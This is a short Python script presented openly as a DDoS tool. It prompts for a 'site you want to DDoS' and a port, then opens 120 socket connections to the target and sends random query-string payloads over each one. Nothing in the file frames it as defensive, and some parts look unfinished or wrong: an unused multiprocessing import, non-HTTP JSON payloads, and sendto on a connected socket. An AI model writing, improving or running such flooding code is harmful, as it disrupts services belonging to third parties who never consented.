import random
from helpers import useragents
# Importing http client to make http request
import multiprocessing
import json
import socket


def getRandomUrl():
    url = "/?"
    for i in range(random.randint(1, 8)):
        key = useragents.generateQueryString(random.randint(
            1, 5))
        value = useragents.generateQueryString(random.randint(
            1, 5))
        url += f"{key}={value}&"
    return url


def attack_worker(ip_address, port, number_of_sockets, ):
    try:
        # Connection sockets list
        sockets = []
        # For each socket create one http connection
        # Create the connection inside the for loop
        for i in range(number_of_sockets):
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((ip_address, port))

            # Append the connection inside the sockets list
            sockets.append(ddos)

        # Send the request from each socket connection
        for ddos in sockets:
            # Get the random headers and url
            random_url = getRandomUrl()
            message = json.dumps(random_url).encode()
            ddos.send(message)
            ddos.sendto(message, (ip_address, port))
            ddos.send(message)

        # Close the connection to cleanup
        for conn_close in sockets:
            try:
                conn_close.close()
            except:
                pass  # silently ignore
    except Exception as err:
        print(err)


def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    ip_address = socket.gethostbyname(host)

    # Default number of sockets
    number_of_sockets = 120

    print("|| DDoS Loaded ||")

    # Pass number of sockets
    attack_worker(ip_address, port, number_of_sockets)


if __name__ == "__main__":
    main()
